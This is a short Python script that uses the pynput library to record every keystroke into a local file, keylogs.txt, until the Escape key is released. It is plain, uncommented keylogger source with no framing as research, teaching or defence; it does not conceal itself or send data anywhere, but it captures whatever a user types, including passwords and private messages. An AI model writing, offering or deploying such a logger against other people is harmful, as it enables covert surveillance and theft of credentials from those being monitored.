import os
from pynput import keyboard

def on_press(key):
    try:
        if key == keyboard.Key.space:
            with open('keylogs.txt', 'a') as f:
                f.write('[SPACE] ')
        elif key == keyboard.Key.enter:
            with open('keylogs.txt', 'a') as f:
                f.write('\n')
        else:
            with open('keylogs.txt', 'a') as f:
                f.write(f'{key} ')
    except AttributeError:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

if not os.path.exists('keylogs.txt'):
    with open('keylogs.txt', 'w') as f:
        pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()